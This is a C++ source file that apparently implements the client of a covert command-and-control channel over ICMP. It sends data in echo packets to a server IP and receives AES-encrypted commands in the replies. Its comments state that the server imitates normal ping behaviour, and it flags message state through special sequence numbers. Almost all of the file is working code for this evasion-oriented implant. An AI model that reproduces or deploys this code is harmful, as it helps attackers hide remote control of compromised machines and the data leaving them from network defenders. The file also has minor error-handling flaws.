#include "icmp.h"
#include "helpers.h"
#include "AESHandler.h"
#include "Client.h"

#define ICMP_ECHO 8
#define ICMP_ECHOREPLY 0

using namespace Helper;

Custom_icmp::Custom_icmp(int id, int seq, float delay) {
	p_id = id;
	p_seq = seq;
    p_delay = delay;

}

int Custom_icmp::getId() {
	return p_id;
}

int Custom_icmp::getSeq() {
	return p_seq;
}

float Custom_icmp::getDelay() {
    return p_delay;
}

void Custom_icmp::setId(int new_id) {
	p_id = new_id;
}

void Custom_icmp::setSeq(int new_seq) {
	p_seq = new_seq;
}

void Custom_icmp::setDelay(float new_delay) {
    p_delay = new_delay;
}

unsigned short Custom_icmp::calculateChecksum(void* b, int len) {
     auto* buf = reinterpret_cast<unsigned short*>(b);
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;

}

SOCKET Custom_icmp::createSocket() {
    // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << "\n";
        return 1;
    }

    SOCKET sockfd;
    sockaddr_in addr{};

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "socket failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    // Set a timeout for receiving data
    DWORD timeout_ms = 5000; // 5 seconds
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms)) == SOCKET_ERROR) {
        std::cerr << "setsockopt failed" << std::endl;
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    return sockfd;
}

icmp_packet_t* Custom_icmp::createPacket(std::string& payload, std::string& last_element, bool connected) {
    // Set the packet size based on the ICMP header size and the payload length
    int packet_size = sizeof(icmp_packet_t) + payload.size();
    icmp_packet_t* packet = static_cast<icmp_packet_t*>(malloc(packet_size));
    if (!packet) {
        return nullptr;
    }
    if (connected) {
        // Fill in the ICMP packet fields
        packet->type = ICMP_ECHO;
        packet->code = 0;
        packet->checksum = 0;
        packet->id = ntohs(p_id);
        packet->seq = (payload == last_element) ? ntohs(37) : ntohs(13);
    } else {
        // Fill in the ICMP packet fields
        packet->type = ICMP_ECHO;
        packet->code = 0;
        packet->checksum = 0;
        packet->id = ntohs(p_id);
        packet->seq = (payload == last_element) ? ntohs(80) : ntohs(14);
    }
    

    // Copy the payload into the packet, after the ICMP header
    memcpy(reinterpret_cast<char*>(packet) + sizeof(icmp_packet_t), payload.c_str(), payload.size());

    // Calculate the checksum of the packet including the payload
    packet->checksum = calculateChecksum(packet, packet_size);

    return packet;
}

std::string Custom_icmp::sendPing(SOCKET sockfd, const std::string& ip_addr, std::vector<std::string>& payload, bool connected, bool exit) {
    int packet_size;
    for (std::string& str : payload) {
        std::string& last = payload.back();
        icmp_packet_t* packet = createPacket(str, last, connected);
        if (!packet) {
            std::cerr << "Failed to create ICMP packet\n";
            return "Failed to create ICMP packet";
        }

        sockaddr_in addr{};
        
        // Set the destination address
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());

        // Send the packet
        if (sendto(sockfd, reinterpret_cast<char*>(packet), sizeof(icmp_packet_t) + str.length(), 0, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
            std::cerr << "sendto failed: " << WSAGetLastError() << "\n";
            free(packet);
            closesocket(sockfd);
            WSACleanup();
            return "sendto failed";
        }
        if (!exit) {
            
            // After each packet, check if server cancels the command
            std::string server_response = receivePing(sockfd);
            if (server_response == "SERVER OFFLINE") {
                std::cout << "\033[31m" << "[-] SERVER OFFLINE" << "\033[0m" << "\n";
                return "SERVER OFFLINE";
            }


            // This is a standard response from the server because it imitates normal ping behaviour, this means that server has no command for us (or no cancel-command) -> we can safely disregard this response
            if (server_response == "abcdefghijklmnopqrstuvwabcdefghi") {
                server_response = "";
            }

            // If this hits, either of these two options has ocurred:
                // 1. The server has initiated a "cancel-command" (maybe because they regretted the original command).
                // 2. The client has successfully sent the response to the server, and the server replies instantly.
            if (server_response.length() > 1) {
                std::vector<unsigned char> server_ciphertext = hex_to_bytes(server_response);
                std::string decrypted_ciphertext = aesHandler->decryptMessage(server_ciphertext);

                // If server responds with "cancel", we return immediately 
                if (decrypted_ciphertext == "cancel") {
                    return "cancel";
                }
                // Save the server response
                client->setServerCommand(decrypted_ciphertext);

            }
        }
        
        
        // Sleep X milliseconds between each sent packet, otherwise the transmission of packets goes to fast and packets gets lost
        Sleep(client->getDelay());
    }

    return "";
}

std::string Custom_icmp::receivePing(SOCKET sockfd) {
    // Receive the response
    char recv_buf[1024];
    sockaddr_in from{};
    int from_len = sizeof(from);
    int bytes_received;
    bytes_received = recvfrom(sockfd, recv_buf, sizeof(recv_buf), 0, reinterpret_cast<sockaddr*>(&from), &from_len);
    
    if (bytes_received == SOCKET_ERROR) {
        std::cerr << "recvfrom failed: " << WSAGetLastError() << "\n";
        closesocket(sockfd);
        WSACleanup();
        return "SERVER OFFLINE";
    }
    else if (bytes_received == 0) {
        std::cerr << "No data received\n";
        return "ERROR";
    }
    // Extract the ICMP header from the response
    auto* icmp_resp = reinterpret_cast<icmp_packet_t*>(recv_buf + sizeof(iphdr));
    iphdr* ip_header = reinterpret_cast<iphdr*>(recv_buf);
    //std::cout << "IP header: " << ip_header->saddr << " -> " << ip_header->daddr << "\n";
    //std::cout << "ICMP ID: " << ntohs(icmp_resp->id) << ", Seq: " << ntohs(icmp_resp->seq) << "\n";    // Calculate the payload length
    int resp_payload_len = bytes_received - sizeof(iphdr) - sizeof(icmp_packet_t);
    // Print the response
    //std::cout << "Received packet from " << inet_ntoa(from.sin_addr) << " with id=" << ntohs(icmp_resp->id) << ", seq=" << ntohs(icmp_resp->seq) << " and data=" << resp_payload_len << " bytes\n";

    // Print the payload data
    auto* payload_data = reinterpret_cast<char*>(icmp_resp) + sizeof(icmp_packet_t);
    

    std::string server_data = "";
    for (int i = 0; i < resp_payload_len; i++) {
        server_data += payload_data[i];
        
    }
    
    //free(packet);
    //closesocket(sockfd);
    //WSACleanup();
    return server_data;
}